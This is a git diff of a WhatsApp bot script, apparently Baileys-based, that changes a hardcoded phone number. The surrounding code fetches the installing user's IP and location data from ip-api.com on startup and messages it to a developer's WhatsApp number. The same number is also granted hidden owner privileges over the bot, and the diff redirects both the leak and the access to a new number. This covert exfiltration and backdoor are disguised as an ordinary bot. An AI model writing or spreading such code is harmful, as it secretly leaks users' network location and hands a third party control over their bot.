@@ -43,7 +43,7 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("917356378949@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Anees ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/917356378949?text=Hi bro"}}})
+       denz.sendMessage("917356378949@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Anees ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/918089847647?text=Hi bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
       
@@ -69,8 +69,8 @@ exec(`cd /sdcard/download && play *mp3`)
    
    denz.on('chat-update', async (mek) => {
         require('./denz.js')(denz, mek)
-        ownerNumber = ["917356378949@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "917356378949@s.whatsapp.net"
+        ownerNumber = ["918089847647@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "918089847647@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
         denz.on('group-participants-update', async (anu) => {
@@ -165,7 +165,7 @@ denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
             quoted: fkontakk})
             //sendButLocation(mdata.id, `${keluar}`, `${uwu}𝙰 𝙽 𝙴 𝙴 𝚂 右${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'BYEE'},type:1}], {contextInfo: { mentionedJid: [num]}})
 			} else if (anu.action == 'promote') {
-fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=91735637894:917356378949\nitem1.X-ABLabel:𝙸𝚗𝚍𝚒𝚊\nEND:VCARD` }}}
+fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=918089847647:918089847647\nitem1.X-ABLabel:𝙸𝚗𝚍𝚒𝚊\nEND:VCARD` }}}
 num = anu.participants[0]
 teks = `*𝙿 𝚁 𝙾 𝙼 𝙾 𝚃 𝙴 - 𝙳 𝙴 𝚃 𝙴 𝙲 𝚃 𝙴 𝙳*\n Username: @${num.split('@')[0]}\n Time : ${moment.tz('Asia/Kolkata').format('DD/MM HH:mm:ss')}\n Group: ${mdata.subject}`
 denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
